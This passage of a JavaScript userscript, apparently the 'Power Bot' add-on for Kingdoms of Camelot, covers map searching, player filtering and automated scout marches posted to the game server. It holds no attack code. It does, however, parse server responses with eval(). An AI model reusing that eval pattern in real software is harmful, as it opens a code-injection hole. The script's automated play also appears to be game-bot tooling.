        m+= '<TR><TD class=xtab align=right>'+translate("Friendly")+':</td><TD class=xtab><INPUT name=pbfil id=pafilFriendly type=CHECKBOX '+ (Options.friendlyOnly?' CHECKED':'') +'\><td></tr>';
        m+= '<TR><TD class=xtab align=right>'+translate("Allied")+':</td><TD class=xtab><INPUT name=pbfil id=pafilAllied type=CHECKBOX '+ (Options.alliedOnly?' CHECKED':'') +'\><td></tr>';
        m+= '<TR><TD class=xtab align=right>'+translate("Neutral")+':</td><TD class=xtab><INPUT name=pbfil id=pafilNeutral type=CHECKBOX '+ (Options.neutralOnly?' CHECKED':'') +'\><td></tr>';
        m+= '<TR><TD class=xtab align=right>'+translate("Unallianced")+':</td><TD class=xtab><INPUT name=pbfil id=pafilunAllied type=CHECKBOX '+ (Options.unalliedOnly?' CHECKED':'') +'\><td></tr>';
        m+= '<TR><TD class=xtab align=right>'+translate("All")+':</td><TD class=xtab><INPUT name=pbfil id=pafilAll type=CHECKBOX '+ (Options.srcAll?' CHECKED':'') +'\><td></tr>';
        m+= '<TR><TD class=xtab align=right>'+translate("Sort By")+':</td><TD class=xtab><SELECT id=pafilSortBy>\
          <OPTION value="might" '+ (Options.srcSortBy=='might'?'SELECTED':'')  +'>'+translate("Might")+'</option>\
             <OPTION value="dist" '+ (Options.srcSortBy=='dist'?'SELECTED':'')  +'>'+translate("Distance")+'</option>\
        </select></td></tr>\
        <TR><TD class=xtab align=right>'+translate("Min")+" "+translate("might")+':</td><TD class=xtab><INPUT type=text id=paminmight size=6 value='+ Options.minmight +'>\
        <TR><TD class=xtab align=right>'+translate("Coordinates only")+':</td><TD class=xtab><INPUT type=checkbox id=pacoordsOnly \></td></tr>\
        </table></div><BR><SPAN id=pasrchSizeWarn></span><DIV id=pbSrcExp></div>';
    
    }
    document.getElementById('padivOutOpts').innerHTML = m;
     if (t.opt.searchType == 1 || t.opt.searchType == 0) {
    document.getElementById('pafilMinLvl').addEventListener ('change', function (){
      Options.srcMinLevel = document.getElementById('pafilMinLvl').value;
      saveOptions();
      t.dispMapTable ();
      }, false);
    document.getElementById('pafilMaxLvl').addEventListener ('change', function (){
      Options.srcMaxLevel = document.getElementById('pafilMaxLvl').value;
      saveOptions();
      t.dispMapTable ();
      }, false);
      }
    document.getElementById('pafilSortBy').addEventListener ('change', function (){
      Options.srcSortBy = document.getElementById('pafilSortBy').value;
      saveOptions();
      t.dispMapTable ();
      }, false);
    document.getElementById('pacoordsOnly').addEventListener ('change', function (){ t.dispMapTable (); }, false);
    if (t.opt.searchType == 1){
      document.getElementById('pafilWildType').addEventListener ('change', function (){
        Options.wildType = document.getElementById('pafilWildType').value;
        saveOptions();
        t.dispMapTable ();
        }, false);
      document.getElementById('pafilUnowned').addEventListener ('change', function (){
        Options.unownedOnly = (document.getElementById('pafilUnowned').checked);
        saveOptions();
        t.dispMapTable ();
        }, false);
    }
    if (t.opt.searchType == 2){
        document.getElementById('pafilMisted').addEventListener ('change', function (){
        Options.mistedOnly = (document.getElementById('pafilMisted').checked);
        if(!Options.mistedOnly){
            document.getElementById('pafilAll').checked = false;
            Options.srcAll = Options.mistedOnly;
        }
        saveOptions();
        t.dispMapTable ();
        }, false);
        document.getElementById('pafilHostile').addEventListener ('change', function (){
        Options.hostileOnly = (document.getElementById('pafilHostile').checked);
        if(!Options.hostileOnly){
            document.getElementById('pafilAll').checked = false;
            Options.srcAll = Options.hostileOnly;
        }
        saveOptions();
        t.dispMapTable ();
        }, false);
        document.getElementById('pafilFriendly').addEventListener ('change', function (){
        Options.friendlyOnly = (document.getElementById('pafilFriendly').checked);
        if(!Options.friendlyOnly){
            document.getElementById('pafilAll').checked = false;
            Options.srcAll = Options.friendlyOnly;
        }
        saveOptions();
        t.dispMapTable ();
        }, false);
        document.getElementById('pafilAllied').addEventListener ('change', function (){
        Options.alliedOnly = (document.getElementById('pafilAllied').checked);
        if(!Options.alliedOnly){
            document.getElementById('pafilAll').checked = false;
            Options.srcAll = Options.alliedOnly;
        }
        saveOptions();
        t.dispMapTable ();
        }, false);
        document.getElementById('pafilNeutral').addEventListener ('change', function (){
        Options.neutralOnly = (document.getElementById('pafilNeutral').checked);
        if(!Options.neutralOnly){
            document.getElementById('pafilAll').checked = false;
            Options.srcAll = Options.neutralOnly;
        }
        saveOptions();
        t.dispMapTable ();
        }, false);
        document.getElementById('pafilunAllied').addEventListener ('change', function (){
        Options.unalliedOnly = (document.getElementById('pafilunAllied').checked);
        if(!Options.unalliedOnly){
            document.getElementById('pafilAll').checked = false;
            Options.srcAll = Options.unalliedOnly;
        }
        saveOptions();
        t.dispMapTable ();
        }, false);
        document.getElementById('pafilAll').addEventListener ('change', function (){
        Options.srcAll = (document.getElementById('pafilAll').checked);
        for(i in document.getElementsByName('pbfil'))
            document.getElementsByName('pbfil')[i].checked = Options.srcAll;
        Options.mistedOnly=Options.hostileOnly=Options.friendlyOnly=Options.alliedOnly=Options.neutralOnly=Options.unalliedOnly=Options.srcAll;
        saveOptions();
        t.dispMapTable ();
        }, false);
        document.getElementById('paminmight').addEventListener ('change', function (){
        Options.minmight = parseIntNan(document.getElementById('paminmight').value);
        saveOptions();
        t.dispMapTable ();
        }, false);
    
    }
    
    document.getElementById('pbAhideShow').addEventListener ('click', t.hideShowClicked, false);
    
    t.mapDat = [];
    t.firstX =  t.opt.startX - t.opt.maxDistance;
    t.lastX = t.opt.startX + t.opt.maxDistance;
    t.firstY =  t.opt.startY - t.opt.maxDistance;
    t.lastY = t.opt.startY + t.opt.maxDistance;
    t.tilesSearched = 0;
    t.tilesFound = 0;
    t.curX = t.firstX;
    t.curY = t.firstY;
    var xxx = t.MapAjax.normalize(t.curX);
    var yyy = t.MapAjax.normalize(t.curY);
    document.getElementById ('pastatStatus').innerHTML = translate('Searching at ')+ xxx +','+ yyy;
    setTimeout (function(){t.MapAjax.request (xxx, yyy, 15, t.eventgetplayeronline)}, MAP_DELAY);
  },

  hideShowClicked : function (){
    var div = document.getElementById('padivOutOpts');
    if (div.style.display == 'none'){
      div.style.display = 'block';
      document.getElementById('spanHideShow').innerHTML = translate('H I D E');
    } else {
      div.style.display = 'none';
      document.getElementById('spanHideShow').innerHTML = translate('S H O W');
    }
  },
  
  dispMapTable : function (){
    var tileNames = ['Barb Camp', 'Grassland', 'Lake', 'Woodlands', 'Hills', 'Mountain', 'Plain', null, 'Dark Forest' ];
    var t = Tabs.Search;
    var coordsOnly = document.getElementById('pacoordsOnly').checked;
    if (DEBUG_SEARCH) DebugTimer.start();
     function mySort(a, b){
      if (Options.srcSortBy == 'level'){
        if ((x = a[4] - b[4]) != 0)
          return x;
      }
      if (Options.srcSortBy == 'might'){
        if ((x = b[10] - a[10]) != 0)
          return x;
      }
      return a[2] - b[2];
    }
    
    dat = [];
    for (i=0; i<t.mapDat.length; i++){
      lvl = parseInt (t.mapDat[i][4]);
      type = t.mapDat[i][3];
      if (t.opt.searchType==2 && type==7 ) {
        if(t.mapDat[i][10] >= Options.minmight || t.mapDat[i][5])
        //if(lvl >= 12)
        if((Options.hostileOnly && t.mapDat[i][12] == 'h') ||
           (Options.mistedOnly && t.mapDat[i][5]===true) ||
           (Options.friendlyOnly && t.mapDat[i][12] == 'f') ||
           (Options.alliedOnly && t.mapDat[i][12] == 'a') ||
           (Options.neutralOnly && t.mapDat[i][12] == 'n') ||
           (Options.unalliedOnly && t.mapDat[i][12] == 'u') ||
           (Options.srcAll))
                dat.push(t.mapDat[i]);
      } else {
       if (lvl>=Options.srcMinLevel && lvl<=Options.srcMaxLevel){
        if (t.opt.searchType==0 || Options.wildType==0
        ||  (Options.wildType==1 && (type==1 || type==2))
        ||  (Options.wildType == type)){
          if (!Options.unownedOnly || t.mapDat[i][5]===false)
            dat.push (t.mapDat[i]);
        }
       }
      }
    }
    if (DEBUG_SEARCH) DebugTimer.display('SEACHdraw: FILTER');

    document.getElementById('pastatFound').innerHTML = translate('Found')+': '+ dat.length;
    if (dat.length == 0){
      m = '<BR><CENTER>'+translate("None found")+'</center>';
    } else {
      dat.sort(mySort);
      if (DEBUG_SEARCH) DebugTimer.display('SEACHdraw: SORT');
      if (coordsOnly)
        m = '<TABLE align=center id=pasrcOutTab cellpadding=0 cellspacing=0><TR style="font-weight: bold"><TD>'+translate("Location")+'</td></tr>';
      else {
      if (t.opt.searchType == 2) {
             m = '<TABLE id=pasrcOutTab class=pbSrchResults cellpadding=0 cellspacing=0><TR style="font-weight: bold"><TD>'+translate("Loc")+'</td><TD align=right>'+translate("Dist")+'</td><TD>'+translate("Player")+'</td><TD align=right>'+translate("Might")+'</td><TD>'+translate("Alliance")+'</td><TD>'+translate("Online")+'</td><TD></td></tr>';
        } else {
            m = '<TABLE id=pasrcOutTab cellpadding=0 cellspacing=0><TR style="font-weight: bold"><TD>'+translate("Location")+'</td><TD style="padding-left: 10px">'+translate("Distance")+'</td><TD style="padding-left: 10px;">'+translate("Lvl")+'</td><TD width=100px> &nbsp; '+translate("Type")+'</td><TD></td><TD>'+translate("Export to Raid")+'</td></tr>';
        }
    }
      var numRows = dat.length;
      if (numRows > t.MAX_SHOW_WHILE_RUNNING && t.searchRunning){
        numRows = t.MAX_SHOW_WHILE_RUNNING;
        document.getElementById('pasrchSizeWarn').innerHTML = '<FONT COLOR=#600000>'+translate('NOTE: Table only shows ')+ t.MAX_SHOW_WHILE_RUNNING +' of '+ dat.length +translate(' results until search is complete')+'.</font>';
      }
      for (i=0; i<numRows; i++){
        m += '<TR><TD><DIV onclick="pbGotoMap('+ dat[i][0] +','+ dat[i][1] +')"><A>'+ dat[i][0] +','+ dat[i][1] +'</a></div></td>';
        if (coordsOnly) {
          m += '</tr>';
        } else {
          if (t.opt.searchType == 2) { // city search
            m += '<TD align="right" >'+ dat[i][2].toFixed(2) +'</td>';
            if (dat[i][5])
              m += '<TD colspan=4>* '+translate("MISTED")+' * &nbsp; &nbsp; <SPAN onclick="pbSearchScout('+ dat[i][0] +','+ dat[i][1] +');return false;"><A>'+translate("Scout")+'</a></span></td></tr>';
            else{
              var allStyle = '';
              if (dat[i][12]=='f')
                allStyle = 'class=pbTextFriendly';
              else if (dat[i][12]=='h')
                allStyle = 'class=pbTextHostile';
              m += '<TD>'+ dat[i][9]+'</td><TD align=right>'+ dat[i][10] +'</td><TD><SPAN '+ allStyle +'>'+ dat[i][11]+'</span></td><TD>'+(dat[i][13]?'<SPAN class=boldDarkRed>'+translate("ONLINE")+'</span>':'')+'</td><TD><A onclick="pbSearchLookup('+ dat[i][7] +')">'+translate("Lookup")+'</a></td></tr>';
            }
            } else {
          m += '<TD align=right  valign="top">'+ dat[i][2].toFixed(2) +' &nbsp; </td><TD align=right>'+ dat[i][4] +'</td><TD> &nbsp; '+ tileNames[dat[i][3]]
            +'</td><TD  valign="top">'+ (dat[i][5]?(dat[i][6]!=0?' <A onclick="pbSearchLookup('+dat[i][6]+')">'+translate("OWNED")+'</a>':'<A onclick="pbSearchScout('+ dat[i][0] +','+ dat[i][1] +');return false;">'+translate("MISTED")+'</a>'):'') +'</td>';
          if (t.opt.searchType == 0) m+= '<TD align=center  valign="top"><A onclick="pbExportToRaid('+ dat[i][0]+','+dat[i][1] +')">'+translate("Export")+'</a></td>';
          m+='</tr>';
            }
        }
            
       }
      m += '</table>';
    }
    document.getElementById('padivOutTab').innerHTML = m;
    dat = null;
    if (DEBUG_SEARCH) DebugTimer.display('SEACHdraw: DRAW');
  },

  mapDat : [],

  stopSearch : function (msg){
    var t = Tabs.Search;
    document.getElementById ('pastatStatus').innerHTML = '<FONT color=#ffaaaa>'+ msg +'</font>';
    document.getElementById ('pasrcStart').value = translate('Start Search');
    document.getElementById ('pasrchSizeWarn').innerHTML = '';
    if (t.opt.searchType==0 && document.getElementById('KOCAttackToggle')!=null){    
      document.getElementById ('pbSrcExp').innerHTML = '<CENTER>'+ strButton20(translate('Export Results'), 'id=pbSrcDoExp') +'</center>';
      document.getElementById ('pbSrcDoExp').addEventListener ('click', t.exportKOCattack, false);
    }
    if (t.opt.searchType==2||t.opt.searchType==1){
      document.getElementById ('pbSrcExp').innerHTML = '<CENTER>'+ strButton20(translate('Generate Scout List'), 'id=pbSrcDoScout') +'</center>';
      document.getElementById ('pbSrcDoScout').addEventListener ('click', t.generateScoutList, false);
    }
    t.searchRunning = false;
    t.dispMapTable();
  },

  exportKOCattack : function (){
    var t = Tabs.Search;
    var bulkAdds = {};
    for (i=1; i<11; i++)
      bulkAdds['lvl'+ i] = [];
    for (i=0; i<t.mapDat.length; i++){
      var lvl = parseInt (t.mapDat[i][4]);
      if (lvl>=Options.srcMinLevel && lvl<=Options.srcMaxLevel && t.mapDat[i][3]==0)
        bulkAdds['lvl'+ lvl].push({x:t.mapDat[i][0], y:t.mapDat[i][1]});
    }
    exportToKOCattack.doExport (bulkAdds, t.selectedCity);
  },
  
  generateScoutList : function (){
    var t = Tabs.Search;
    var bulkScout = [];
    for (i=0; i<t.mapDat.length; i++){
	if(t.opt.searchType==1)
		if (t.mapDat[i][3] == Options.wildType || Options.wildType==0)
		if (t.mapDat[i][4]>=Options.srcMinLevel && t.mapDat[i][4]<=Options.srcMaxLevel)
		if ((Options.unownedOnly && t.mapDat[i][5] == false) || (!Options.unownedOnly))
            bulkScout.push({x:t.mapDat[i][0], y:t.mapDat[i][1], dist:t.mapDat[i][2]});
     if(t.opt.searchType==2) 
      if (t.mapDat[i][3] == 7){
        if(t.mapDat[i][10] >= Options.minmight || t.mapDat[i][5]){
        if((Options.hostileOnly && t.mapDat[i][12] == 'h') ||
           (Options.mistedOnly && t.mapDat[i][5]===true) ||
           (Options.friendlyOnly && t.mapDat[i][12] == 'f') ||
           (Options.alliedOnly && t.mapDat[i][12] == 'a') ||
           (Options.neutralOnly && t.mapDat[i][12] == 'n') ||
           (Options.unalliedOnly && t.mapDat[i][12] == 'u') ||
           (Options.srcAll))
            bulkScout.push({x:t.mapDat[i][0], y:t.mapDat[i][1], dist:t.mapDat[i][2]});
        }
      }
    }
    if(t.selectedCity == null)
        t.selectedCity = Cities.cities[0];
    t.ShowScoutList (bulkScout, t.selectedCity);
  },
  ShowScoutList : function (coordlist, city){
    var t = Tabs.Search;
    var popScout = null;
    t.scoutcity = city;
    
    if(popScout==null){
      popScout = new pbPopup ('pbsrcscout', 0,0, 350,500, true, function (){popScout.destroy(); popScout=null;});
      popScout.centerMe (mainPop.getMainDiv());  
    }
    var m = '<DIV class=pbStat>'+translate("Auto Scout Options")+'</div>';
        m += '<DIV>'+translate("Amount of Scouts to send")+': <input id=pbsrcScoutAmt value="'+Options.srcScoutAmt+'" /></div><BR>';
        m += '<DIV>'+translate("Select City")+': <span id=pbsrcScoutcitypick> </span></div><BR>';
        m += '<DIV class=pbStat>'+translate("Scout from")+' <span id=pbsrcScoutcity>'+city.name+'</span> <BR> '+translate("Total targets ")+coordlist.length+'</div>';
        m += '<DIV style="max-height:220px; overflow-y:auto;"><TABLE align=center cellpadding=0 cellspacing=0 class=pbTabPadNW><TR style="font-weight:bold; background-color:white"><TD width=15><input type=checkbox id=pbsrcScout_All /></td><TD>'+translate("Target Coords")+'</td></tr>';
      for(i=0; i<coordlist.length; i++){
            m += '<TR style="background-color:white"><TD><input type=checkbox name=pbsrcScoutCheck id="pbsrcScoutCheck_'+coordlist[i].x+'_'+coordlist[i].y+'" value="'+coordlist[i].x+'_'+coordlist[i].y+'" /></td><TD>'+coordLink(coordlist[i].x,coordlist[i].y)+'</td></tr>';
      }
        m += '</table></div>';
        m += '<BR><input type=checkbox id="pbskip">Skip targets when errors occur';
        m += '<BR><CENTER>'+ strButton20(translate('Start Scout'), 'id=pbSrcStartScout') +'</center>';
        m += '<CENTER><DIV style="width:70%; max-height:75px; overflow-y:auto;" id=pbSrcScoutResult></DIV></center>';
    popScout.getMainDiv().innerHTML = m;
    new CdispCityPicker ('pbScoutPick', document.getElementById('pbsrcScoutcitypick'), false, function(c,x,y){document.getElementById('pbsrcScoutcity').innerHTML = c.name; t.scoutcity = c; }, city.idx);
    popScout.getTopDiv().innerHTML = '<CENTER><B>Power Bot '+translate("Scout List")+'</b></center>';
    popScout.show(true);
    
    document.getElementById('pbsrcScoutAmt').addEventListener('change', function(){
        Options.srcScoutAmt = parseInt(document.getElementById('pbsrcScoutAmt').value);
        saveOptions();
    }, false);
    document.getElementById('pbsrcScout_All').addEventListener('change', function(){
        for(k in document.getElementsByName('pbsrcScoutCheck'))
            document.getElementsByName('pbsrcScoutCheck')[k].checked = document.getElementById('pbsrcScout_All').checked;
    }, false);
    document.getElementById('pbSrcStartScout').addEventListener('click', t.clickedStartScout, false);
  },
  scouting : false,
  scoutcity : null,
  doScout : function(list, city){
    var t = Tabs.Search;
    document.getElementById('pbSrcScoutResult').innerHTML = '';
    if(list.length < 1){
        document.getElementById('pbSrcScoutResult').innerHTML = '<SPAN class=boldRed>'+translate("ERROR")+': '+translate("No coords selected")+'</span>';
        t.clickedStartScout();
        return;
    }
    if(parseInt(Seed.units['city'+city.id]['unt'+3]) < Options.srcScoutAmt){
        document.getElementById('pbSrcScoutResult').innerHTML = '<SPAN class=boldRed>'+translate("ERROR")+': '+translate("No scouts available")+'</span>';
        t.clickedStartScout();
        return;
    }
    t.doScoutCount(list, city, list.length, 0);
    
  },
  doScoutCount : function(list, city, total, count){
    var t = Tabs.Search;
    if(!t.scouting){
        document.getElementById('pbSrcScoutResult').innerHTML += '<SPAN class=boldRed>'+translate("Scouting stopped by user")+'</span><BR>';
        document.getElementById('pbSrcStartScout').className = 'button20 ptButton20';
        document.getElementById('pbSrcStartScout').innerHTML = '<SPAN>'+translate("Start Scout")+'</span>';
        return;
    }
    if(total <= (count)){
        document.getElementById('pbSrcScoutResult').innerHTML += translate("Done")+'!<BR>';
        t.clickedStartScout();
        return;
    }
    var rallypointlevel = t.getRallypoint(city.id);
    if(rallypointlevel == 12) rallypointlevel = 11;
    var slots = 0;
       for (z in Seed.queue_atkp['city'+city.id]){
             slots++;
       }
    if  (Seed.queue_atkp['city'+city.id].toSource() == "[]") slots=0;

    if(slots >= rallypointlevel){
        setTimeout(function(){t.doScoutCount(list, city, total, count)}, 5000);
        document.getElementById('pbSrcScoutResult').innerHTML += translate('Waiting for rally point to clear')+'...';
        return;
    }
    var coords = list[count].split("_");
    if(coords[0] == 'undefined' || coords[1] == 'undefined'){
        document.getElementById('pbSrcScoutResult').innerHTML += '<SPAN class=boldRed>'+translate("ERROR")+': '+translate("Invalid coords")+'</span>';
        t.clickedStartScout();
        return;
    }
    document.getElementById('pbSrcScoutResult').innerHTML += translate('Sending scouts to ')+coords[0]+','+coords[1]+'...';
    document.getElementById('pbsrcScoutCheck_'+coords[0]+'_'+coords[1]).checked = false;
    t.sendScout(coords[0], coords[1], city, count, function(c){t.doScoutCount(list, city, total, c)});
  },
  sendScout : function(x, y, city, count, notify){
    var t = Tabs.Search;
    count = parseInt(count);
    var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
    params.cid = city.id;
    params.kid = 0;
    params.type = 3;
    params.xcoord = x;
    params.ycoord = y;
    params.u3 = Options.srcScoutAmt;
    new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
         method: "post",
         parameters: params,
         loading: true,
         onSuccess: function (rslt) {
         rslt = eval("(" + rslt.responseText + ")");
         if (rslt.ok) {
             var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
             var ut = unixTime();
				var unitsarr = [];
				for (j in unsafeWindow.unitcost)
					unitsarr.push(0);
				for(i = 0; i <= unitsarr.length; i++)
					if(params["u"+i])
						unitsarr[i] = params["u"+i];
             var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
             var currentcityid = params.cid;
             unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
             if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
             document.getElementById('pbSrcScoutResult').innerHTML += translate('Sent!')+'<BR>';
             if (notify)
              setTimeout(function(){ notify(count+1); }, 1000);
         } else {
			 if(document.getElementById('pbskip').checked) {
             document.getElementById('pbSrcScoutResult').innerHTML += translate('Failed! Moving on')+'....<BR>';
             if (notify)
              setTimeout(function(){ notify(count+1); }, 1000);
			 } else {
             document.getElementById('pbSrcScoutResult').innerHTML += translate('Failed! Retrying')+'....<BR>';
             if (notify)
              setTimeout(function(){ notify(count); }, 1000);
		  }
          }
        },
        onFailure: function () {}
          });
  },
  getRallypoint: function(cityId){
      var t = Tabs.Search;
      cityId = 'city'+cityId;
      for (o in Seed.buildings[cityId]){
        var buildingType = parseInt(Seed.buildings[cityId][o][0]);
        var buildingLevel = parseInt(Seed.buildings[cityId][o][1]);
        if (buildingType == 12){
            return parseInt(buildingLevel);
            break;
        }
       }
      return 0;
    },
    clickedStartScout : function(){
    var t = Tabs.Search;
        if(t.scouting == false){
            t.scouting = true;
            var ScoutList = [];
            for(k=0; k<document.getElementsByName('pbsrcScoutCheck').length; k++){
                if(document.getElementsByName('pbsrcScoutCheck')[k].checked){
                    ScoutList.push(document.getElementsByName('pbsrcScoutCheck')[k].value);
                }
            }
            t.doScout(ScoutList, t.scoutcity);
            document.getElementById('pbSrcStartScout').className = 'button20 pbButCancel';
            document.getElementById('pbSrcStartScout').innerHTML = '<SPAN>'+translate("Stop")+'</span>';
        } else {
            t.scouting = false;
            document.getElementById('pbSrcStartScout').className = 'button20 ptButton20';
            document.getElementById('pbSrcStartScout').innerHTML = '<SPAN>'+translate("Start Scout")+'</span>';
        }
    },
    
  
/** mapdata.userInfo:
(object) u4127810 = [object Object]
    (string) n = George2gh02    (name)
    (string) t = 1              (title code)
    (string) m = 55             (might)
    (string) s = M              (sex)
    (string) w = 2              (mode: 1=normal, 2=begprotect, 3=truce, 4=vacation )
    (string) a = 0              (alliance)
    (string) i = 1              (avatar code)
*****/
  mapCallback : function (uList){
    var t = Tabs.Search;

    var rslt = t.SearchList;
    map = rslt.data;
    var Dip = Seed.allianceDiplomacies;    
    var userInfo = rslt.userInfo;
    var alliance = rslt.allianceNames;
    
    for (k in map){
      if (t.opt.searchType==0 && map[k].tileType==51 && !map[k].tileCityId ) {  // if barb
        type = 0;
      } else if (t.opt.searchType==1 && map[k].tileType>=10 &&  map[k].tileType<=50) { // if wild
        if (map[k].tileType == 10)
          type = 1;
        else if (map[k].tileType == 11)
          type = 2;
        else
          type = (map[k].tileType/10) + 1;
      } else if (t.opt.searchType==1 && map[k].tileType==54) {
            type = 8;
      } else if (t.opt.searchType==2 && map[k].tileCityId>=0 && map[k].tileType>50 && map[k].cityName) {
            type = 7;
      } else
        continue;
        
      var dist = distance (t.opt.startX, t.opt.startY, map[k].xCoord, map[k].yCoord);
      if ((t.opt.searchShape=='circle' && dist <= t.opt.maxDistance)
      ||  (t.opt.searchShape=='square' && map[k].xCoord>=t.firstX && map[k].xCoord<=t.lastX && map[k].yCoord>=t.firstY && map[k].yCoord<=t.lastY)){
            if (t.opt.searchType==2) {    // if city search
                var isMisted = map[k].tileUserId == 0 || false;        
                var uu = 'u'+map[k].tileUserId;
                var aD = '';
                  var nameU = '';
                  var mightU = '';
                  var aU = '';
                if (!isMisted && userInfo[uu]) {
                    nameU = userInfo[uu].n;   // can error, must check if (userInfo[uu])
                    mightU = userInfo[uu].m;
                    if (alliance['a'+userInfo[uu].a])
                        aU = alliance['a'+userInfo[uu].a];
                    else
                      aU = '----';
                    aD = '';
                    if (Dip.friendly && Dip.friendly['a'+userInfo[uu].a]) aD = 'f';
                    if (Dip.hostile && Dip.hostile['a'+userInfo[uu].a]) aD = 'h';
                    if (Dip.allianceId && Dip.allianceId==userInfo[uu].a) aD = 'a';
                    if (getDiplomacy(userInfo[uu].a) == 'neutral') aD = 'n';
                    if (!userInfo[uu].a || userInfo[uu].a==0) aD = 'u';
                    
                }
// TODO: save memory, remove city name ?               
          t.mapDat.push ([map[k].xCoord, map[k].yCoord, dist, type, map[k].tileLevel, isMisted, map[k].tileCityId, map[k].tileUserId, map[k].cityName, nameU, mightU, aU, aD, uList.data[map[k].tileUserId]?1:0]);
        } else {
          isOwned = map[k].tileUserId>0 || map[k].misted;
          t.mapDat.push ([map[k].xCoord, map[k].yCoord, dist, type, map[k].tileLevel, isOwned, (map[k].tileUserId>0? map[k].tileUserId : 0), uList.data[map[k].tileUserId]?1:0]);
        }
        ++t.tilesFound;
      }
    }
    
    t.tilesSearched += (15*15);
    document.getElementById('pastatSearched').innerHTML = translate('Searched: ')+ t.tilesSearched;
    t.dispMapTable();

    t.curX += 15;
    if (t.curX > t.lastX){
      t.curX = t.firstX;
      t.curY += 15;
      if (t.curY > t.lastY){
        t.stopSearch (translate('Done!'));
        return;
      }
    }
    var x = t.MapAjax.normalize(t.curX);
    var y = t.MapAjax.normalize(t.curY);
    document.getElementById ('pastatStatus').innerHTML = 'Searching at '+ x +','+ y;
    setTimeout (function(){t.MapAjax.request (x, y, 15, t.eventgetplayeronline)}, MAP_DELAY);
  },
  
  eventgetplayeronline : function (left, top, width, rslt){
    var t = Tabs.Search;
    if (!t.searchRunning)
      return;
    if (!rslt.ok){
      t.stopSearch (translate('ERROR')+': '+ rslt.errorMsg);
      return;
    }
    
    map = rslt.data;
    t.SearchList = rslt;
    var uList = [];
    for(k in map){
        if(map[k].tileUserId != null)
            uList.push(map[k].tileUserId);
    }
    t.fetchPlayerStatus (uList, function(r){ t.mapCallback(r)});
  },

  clickedScout : function (x, y){
    unsafeWindow.modal_attack (3, x, y);
    CwaitForElement ('modal_attack', 5000, function (){document.getElementById('modalBox1').style.zIndex='112000'});
  },
    
  clickedLookup : function (pid){
    var t = Tabs.Search;
    var pop = new pbPopup ('pbsrclookup', 0,0, 500,500, true);
    if (t.popFirst){
      pop.centerMe (mainPop.getMainDiv());  
      t.popFirst = false;
    }
    pop.getTopDiv().innerHTML = '<CENTER><B>'+translate("Player Lookup")+'</b></center>';
    pop.getMainDiv().innerHTML = '<DIV class=pbStat>'+translate("Leaderboard information")+'</div><SPAN id=pblupLB>'+translate("Looking up leaderboard")+'...</span>\
      <BR><DIV class=pbStat>'+translate("Alliance Lookup")+'</div><SPAN id=pblupAI>'+translate("Looking up alliance info")+'...</span>';
    pop.show (true);
    t.fetchLeaderboard (pid, function (r){t.gotPlayerLeaderboard(r, document.getElementById('pblupLB'))});
    t.fetchPlayerInfo (pid, function (r){t.gotPlayerInfo(r, document.getElementById('pblupAI'))});
  },

  ExportToRaid : function (X,Y){
    var t = Tabs.Search;
    var cityId =t.selectedCity['id'];
    var pop = new pbPopup ('pbExportRaid', 0,0, 800,300, true);
    if (t.popFirst){
      pop.centerMe (mainPop.getMainDiv());  
      t.popFirst = false;
    }
    pop.getTopDiv().innerHTML = '<CENTER><B>'+translate("Export to Raid")+'</b></center>';
    
      var m = '<TABLE id=pbRaidAdd width=100% height=0% class=pbTab><TR align="center">';
      m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_1_50.jpg?6545"></td>';
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt1']) +'</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_2_50.jpg?6545"></td>'
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt2']) +'</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_3_50.jpg?6545"></td>'
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt3']) +'</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_4_50.jpg?6545"></td>'
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt4']) +'</td></tr>'
      m += '<TR><TD><INPUT id=Unit1 type=text size=6 maxlength=6 value="0"></td>';
      m += '<TD><INPUT id=Unit2 type=text size=6 maxlength=6 value="0"></td>';
      m += '<TD><INPUT id=Unit3 type=text size=6 maxlength=6 value="0"></td>';
      m += '<TD><INPUT id=Unit4 type=text size=6 maxlength=6 value="0"></td></tr>';
      
      m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_5_50.jpg?6545"></td>';
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt5']) +'</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_6_50.jpg?6545"></td>'
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt6']) +'</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_7_50.jpg?6545"></td>'
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt7']) +'</td>'
      m += '<TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_8_50.jpg?6545"></td>'
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt8']) +'</td></tr>'
      m += '<TR><TD><INPUT id=Unit5 type=text size=6 maxlength=6 value="0"></td>';
      m += '<TD><INPUT id=Unit6 type=text size=6 maxlength=6 value="0"></td>';
      m += '<TD><INPUT id=Unit7 type=text size=6 maxlength=6 value="0"></td>';
      m += '<TD><INPUT id=Unit8 type=text size=6 maxlength=6 value="0"></td></tr>';
      
      m += '<TR><TD rowspan="2"><img src="http://cdn1.kingdomsofcamelot.com/fb/e2/src/img/units/unit_9_50.jpg?6545"></td>';
      m += '<TD>'+ addCommas(Seed.units['city'+cityId]['unt9']) +'</td>'
